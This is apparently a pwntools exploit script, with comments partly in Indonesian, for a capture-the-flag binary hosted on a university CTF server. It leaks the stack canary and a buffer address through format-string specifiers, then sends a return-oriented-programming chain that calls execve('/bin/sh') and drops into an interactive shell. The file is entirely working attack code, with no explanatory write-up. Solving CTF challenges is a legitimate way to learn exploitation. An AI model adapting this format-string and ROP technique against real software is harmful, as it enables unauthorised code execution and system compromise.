#!/usr/bin/python3
from pwn import *

# Inisialisasi nilai-nilai utama
target_binary = context.binary = ELF("chall")
server_address = "ctf99.cs.ui.ac.id"
server_port = 10023

# ROP Gadget addresses
pop_rsi_address = 0x00000000004017A7
pop_rdi_address = 0x0000000000400595
pop_rax_rdx_rbx_address = 0x000000000046D816
syscall_address = 0x00000000004003FC

# Membuka koneksi ke server CTF
def open_connection():
    connection = remote(server_address, server_port)
    return connection

# Fungsi untuk mengumpulkan informasi yang dibutuhkan untuk exploit
def gather_information(connection):
    # Leak canary value
    connection.recvuntil(b"> ")
    connection.sendline(b"%7$p")
    canary = int(connection.recvuntil(b"> ")[:-2], 16)
    log.info("Canary: " + hex(canary))

    # Leak buffer start address
    connection.sendline(b"%8$p")
    buffer_start = int(connection.recvuntil(b"> ")[:-2].strip(), 16) - 0x30
    log.info("Buffer start at: " + hex(buffer_start))

    return canary, buffer_start

# Membuat dan mengirim payload
def create_and_send_payload(connection, canary, buffer_start):
    payload = flat(
        b"/bin/sh\0",
        canary,
        b"B" * 0x8,
        pop_rdi_address,
        buffer_start,
        pop_rsi_address,
        0,
        pop_rax_rdx_rbx_address,
        0x3B,
        0,
        0,
        syscall_address,
    )
    connection.sendline(payload)

# Main function to use the above functions
def main():
    connection = open_connection()
    canary, buffer_start = gather_information(connection)
    create_and_send_payload(connection, canary, buffer_start)
    connection.interactive()

# Start
if __name__ == "__main__":
    main()
